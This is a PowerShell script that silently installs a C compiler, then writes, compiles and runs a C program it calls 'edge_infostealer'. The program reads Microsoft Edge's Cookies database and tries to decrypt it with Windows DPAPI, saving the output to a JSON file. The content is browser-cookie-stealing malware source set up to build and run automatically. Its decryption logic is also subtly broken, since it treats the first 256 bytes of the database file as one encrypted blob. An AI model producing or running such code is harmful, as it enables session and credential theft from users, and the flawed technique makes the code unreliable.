# Define the URL for w64devkit
$w64devkitUrl = "https://github.com/skeeto/w64devkit/releases/download/v2.0.0/w64devkit-x86-2.0.0.exe"
$w64devkitExe = "w64devkit-x86-2.0.0.exe"
$w64devkitDir = "w64devkit"

# Download w64devkit
Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe

# Run the w64devkit installer
Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait

# Define the C program
$cProgram = @"
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function to decrypt data using Windows DPAPI
void decrypt_data(const BYTE *data, DWORD data_len, BYTE **decrypted_data, DWORD *decrypted_data_len) {
    DATA_BLOB encrypted_blob;
    DATA_BLOB decrypted_blob;

    encrypted_blob.pbData = (BYTE *)data;
    encrypted_blob.cbData = data_len;

    if (CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob)) {
        *decrypted_data = (BYTE *)malloc(decrypted_blob.cbData);
        memcpy(*decrypted_data, decrypted_blob.pbData, decrypted_blob.cbData);
        *decrypted_data_len = decrypted_blob.cbData;
        LocalFree(decrypted_blob.pbData);
    } else {
        printf("Decryption failed: %d\n", GetLastError());
    }
}

// Function to read the cookies file and extract encrypted data
void read_cookies_file(const char *path) {
    FILE *file = fopen(path, "rb");
    if (!file) {
        perror("Failed to open file");
        return;
    }

    // Example buffer to hold encrypted data (this should be read from the file)
    BYTE encrypted_data[256];
    DWORD encrypted_data_len = fread(encrypted_data, 1, sizeof(encrypted_data), file);
    fclose(file);

    if (encrypted_data_len > 0) {
        BYTE *decrypted_data = NULL;
        DWORD decrypted_data_len = 0;

        decrypt_data(encrypted_data, encrypted_data_len, &decrypted_data, &decrypted_data_len);

        if (decrypted_data) {
            // Write decrypted data to JSON file
            FILE *json_file = fopen("decrypted.json", "w");
            if (json_file) {
                fprintf(json_file, "{\n\t\"decrypted_data\": \"%.*s\"\n}\n", decrypted_data_len, decrypted_data);
                fclose(json_file);
                printf("Decrypted data written to decrypted.json\n");
            } else {
                perror("Failed to open JSON file");
            }
            free(decrypted_data);
        }
    } else {
        printf("No data read from file\n");
    }
}

int main() {
    const char *cookies_path = "C:\\Users\\<YourUsername>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
    read_cookies_file(cookies_path);
    return 0;
}
"@

# Save the C program to a file
$cProgramPath = "edge_infostealer.c"
Set-Content -Path $cProgramPath -Value $cProgram

# Compile the C program using w64devkit
$w64devkitBin = "C:\w64devkit\bin"
$gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32"
Invoke-Expression $compileCommand

# Run the compiled executable
$exePath = ".\edge_infostealer.exe"
Invoke-Expression $exePath
